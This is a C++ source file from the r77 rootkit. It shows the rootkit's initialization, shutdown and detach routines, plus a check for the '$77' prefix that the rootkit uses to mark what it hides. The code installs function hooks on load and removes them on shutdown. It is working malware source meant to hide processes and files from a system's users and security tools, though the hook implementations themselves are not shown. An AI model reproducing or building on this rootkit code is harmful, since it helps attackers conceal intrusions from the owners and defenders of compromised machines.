#include "r77.h"

bool Rootkit::IsInitialized = false;
HINSTANCE Rootkit::Module = NULL;

bool Rootkit::Initialize(const HINSTANCE &module)
{
	InitializeApi(0);

	WCHAR executablePath[MAX_PATH + 1];
	if (!SUCCEEDED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return false;

	// If the process starts with $77, do not load r77.
	if (HasPrefix(PathFindFileNameW(executablePath))) return false;

	// Write the r77 header.
	if (!Register::Initialize()) return false;

	if (!IsInitialized)
	{
		IsInitialized = true;
		Module = module;

		// Initialize configuration system.
		Config::Initialize();

		// Install hooks.
		Hooks::Initialize();
	}

	return true;
}
void Rootkit::Shutdown()
{
	if (IsInitialized)
	{
		IsInitialized = false;

		// Remove the r77 header.
		Register::Shutdown();

		// Uninitialize configuration system.
		Config::Shutdown();

		// Unhook functions.
		Hooks::Shutdown();
	}
}
void Rootkit::Detach()
{
	Shutdown();
	FreeLibraryAndExitThread(Module, 0);
}

bool Rootkit::HasPrefix(LPCWSTR str)
{
	return str && !_wcsnicmp(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}
bool Rootkit::HasPrefix(UNICODE_STRING str)
{
	return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !_wcsnicmp(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}